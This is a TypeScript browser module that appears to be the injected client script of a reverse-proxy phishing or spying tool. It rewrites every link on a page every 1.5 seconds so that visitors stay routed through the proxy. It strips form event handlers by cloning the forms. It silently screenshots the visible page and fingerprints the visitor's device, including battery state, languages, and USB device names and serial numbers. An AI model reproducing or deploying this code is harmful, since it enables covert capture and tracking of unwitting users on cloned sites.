import { joinUrls, getUrlPath, getUrlBase, count, cloneElement } from './utils'


export function resolveFavIconEdgeCases () {
    let icon:HTMLLinkElement = document.querySelector('link[rel*="icon"]')

    if (!icon) {
        const secondSrc:HTMLMetaElement = document.querySelector('meta[itemprop="image"]')

        icon = document.createElement('link')
        icon.type = 'image/x-icon'
        icon.rel = 'shortcut icon'
        icon.href = secondSrc ? secondSrc.content : ''

        document.getElementsByTagName('head')[0].appendChild(icon)
    }
}


export function resolveEventfulForms () {
    const forms = Array.from(document.querySelectorAll('form'))

    forms.forEach(form => cloneElement(form))
}


export function resolveLazyLoadedLinks () {
    const originalName = getUrlBase(window.ORIGINAL, false)
    const resolver = () => {
        Array
            .from(document.querySelectorAll('a'))
            .forEach((link) => {
                /* Urls lazy loaded and weren't parsed by backend, let's do it again here. */
                const conditions = [
                    !(new RegExp(`\/${originalName}|\/${encodeURIComponent(originalName)}`).test(link.href)),
                    /^#|javascript/.test(link.href) === false,
                    count('/http', link.href) === 0
                ]

                if (conditions.every(c => c)) {
                    let parsedLink:string

                    if (!link.href.startsWith(origin)) {
                        parsedLink = encodeURIComponent(link.href)
                    } else {
                        const urlPath = link.href.startsWith('http') ? getUrlPath(link.href) : link.href
                        const originalBase= getUrlBase(window.ORIGINAL, true)

                        parsedLink = encodeURIComponent(joinUrls(originalBase, urlPath))
                    }

                    /* Some websites have predefined click events, cloning gets rid of them 🔎 */
                    const clonedLink = cloneElement(link)

                    clonedLink.href = parsedLink
                    clonedLink.onclick = (event:Event) => {
                        event.preventDefault()
                        window.location.href = parsedLink
                    }
                }
            })
    }

    resolver()
    return setInterval(resolver, 1500)
}


export async function getScreenShot ():Promise<string|undefined> {
    const html2canvas = require('html2canvas')

    try {
        const canvas:HTMLCanvasElement = await html2canvas(document.body, {
            proxy: window.location.origin + '/proxy',
            allowTaint: true,
            foreignObjectRendering: false,
            logging: false,
            useCORS: false,
            height: window.innerHeight,
            width: window.innerWidth,
            scrollX: window.scrollX,
            scrollY: -window.scrollY
        })

        return canvas.toDataURL('image/jpeg')
    } catch(err) { console.warn(err) }
}


export async function getGeneralInfo () {
    const battery = await navigator?.getBattery()
    const usbDevices = await navigator?.usb?.getDevices()

    return {
        charging: battery?.charging,
        chargeLeft: ((battery?.charging ? battery.chargingTime : battery?.dischargingTime) / 60) / 60,
        doNotTrack: navigator.doNotTrack,
        java: navigator.javaEnabled(),
        flash: !!navigator.mimeTypes['application/x-shockwave-flash'],
        language: navigator.language,
        languages: navigator.languages,
        touch: navigator.maxTouchPoints > 0,
        usbDevices: usbDevices.map(d => `Name: ${d.productName} , Serial: ${d.serialNumber}`),
        resolution: `${window.screen.width}x${window.screen.height}`
    }
}
